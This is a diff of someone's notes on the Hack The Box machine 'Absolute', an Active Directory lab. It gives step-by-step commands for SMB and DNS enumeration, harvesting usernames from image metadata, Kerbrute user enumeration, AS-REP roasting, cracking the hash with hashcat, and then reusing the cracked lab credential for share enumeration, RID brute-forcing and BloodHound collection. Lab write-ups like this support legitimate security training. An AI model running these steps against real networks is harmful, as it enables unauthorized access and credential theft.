@@ -34,8 +34,10 @@ The time to live(ttl) indicates its OS. It is a decrementation from each hop bac
 Alh4zr3d: Starts with CME
 ```bash
 crackmapexec smb $IP -u '' -p ''
-crackmapexec smb $IP -u '' -p '' --shares
+crackmapexec smb $IP -u '' -p '' --shares 
 ```
+No guest access to shares, but we have host OS information
+![](cmebaseenum.png)
 
 Alh4zr3d: Background UDP scan 
 ```bash
@@ -44,8 +46,15 @@ sudo nmap -sU -p- -oG nmap/udp-full $IP --min-rate 300
 
 DNS recon
 ```bash
-
+nslookup
+dig axfr dc.absolute.htb @10.129.228.64
+dig axfr absolute.htb @10.129.228.64
 ```
+
+And the outputs:
+![](nslookup.png)
+
+![](nodomaintransfer.png)
 
 All:
 ```bash
@@ -60,14 +69,27 @@ gobuster dir -u http://absolute.htb -w /usr/share/seclist/
 gobuster vhost -u  http://absolute.htb -w /usr/share/seclist/
 ```
 
+Similarly fruitless as the above, but for the sake of completeness
+![](norpcnullauth.png)
+
+0xdf:
+```bash
+for i in $(seq 1 6); do wget http://absolute.htb/images/hero_${i}.jpg; done
+```
+
 Ippsec:
 ```bash
-wget -R 
-exiftool images/* 
+wget -r http://absolute.htb
 find . -type f -exec exiftool {} \; grep Author | awk -F: '{print $2}' | sed 's/^ //g' > ../users.txt
 ```
 
-Ippsec: Username Anarchy 
+I decided for
+```bash
+exiftool www/images/hero* > exiftoolOnAllheroJPGs.out
+cat exiftoolOnAllheroJPGs.out | grep 'Author' | awk -F: '{print $2}' | sed 's/^ //g' > fullnames.txt
+```
+
+Ippsec and 0xDF: [Username Anarchy](https://github.com/urbanadventurer/username-anarchy.git), have not tried this I used it with similar positive results
 ```bash
 cp users.txt ua-input.txt
 sed -i 's/ /,/g' ua-input.txt
@@ -88,7 +110,6 @@ sudo ntpdate dc.absolute.htb
 # Sync
 sudo ntpdate -s dc.absolute.htb
 # Reset with
-
 ```
 
 Ippsec and Alh4zr3d: Kerbrute to enumerate users and get potential ASREProastable users
@@ -100,30 +121,57 @@ go build
 ./kerbrute userenum --dc dc.absolute.htb -d absolute.htb potential-usernames.txt -o kerbrute.out
 ```
 
+![](berbruteusernames.png)
+
 Ippsec:
 ```bash
 cat kerbrute.out |grep USERNAME | awk '{print $7}' > valid-users.txt
 ```
 
-Ippsec:
+Ippsec - this requires the same version of Kerbrute as Ippsec the latest does:
 ```bash
+# For Kali or Parrot git clone and build with `go build`
 ./kerbrute userenum --dc dc.absolute.htb -d absolute.htb valid-users.txt --downgrade -o kerbrute-dg-asreproast.out
 ```
 
-Ippsec  Impacket can also do this
-```
+0xDF: Impacket can also do this:
+```bash
 impacket-GetNPUsers -request -usersfile .txt -dc-ip $IP -d absolute.htb/
 ```
+
+[Viperone AS-REP roasting](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/steal-or-forge-kerberos-tickets/as-rep-roasting)
+
+AS-REP roast successful against d.klay
+![](dklayimpakcetasreproast.png)
+
+[Hashcat examples](https://hashcat.net/wiki/doku.php?id=example_hashes) plus `CTRL + F -> krb5asrep$23`
+![](findthehashcatmode.png)
+```bash
+# Hashcat auto was correct
+hashcat dklay.hash /usr/share/wordlists/rockyou.txt
+```
+And cracked..
+![](krackedklay.png)
+
+First credentials
+```
+d.klay : Darkmoonsky248girl
+```
+
+Then used with cme to prove sync date and time is important
+![](provedateandtime.png)
+
+
 
 Ippsec and Alh4zr3d: 
 ```bash
 # cme -k kerberos authentication
-crackmapexec smb -k -u d.klay -p '' 
+crackmapexec smb 10.129.228.64 -k -u d.klay -p 'Darkmoonsky248girl' 
 # Either this is protect users account or more likely ntlm is disabled - it is a protected users account
-crackmapexec smb -k -u d.klay -p '' --shares
-crackmapexec smb -k -u d.klay -p '' --rid-brute
+crackmapexec smb 10.129.228.64 -k -u d.klay -p 'Darkmoonsky248girl' --shares
+crackmapexec smb 10.129.228.64 -k -u d.klay -p 'Darkmoonsky248girl' --rid-brute
 
-crackmapexec ldap -k -u d.klay -p '' --bloodhound -ns $IP --collection All
+crackmapexec ldap 10.129.228.64 -k -u d.klay -p 'Darkmoonsky248girl' --bloodhound -ns 10.129.228.64 --collection All
 ```
 
 Ippsec: Get TGT for d.klay
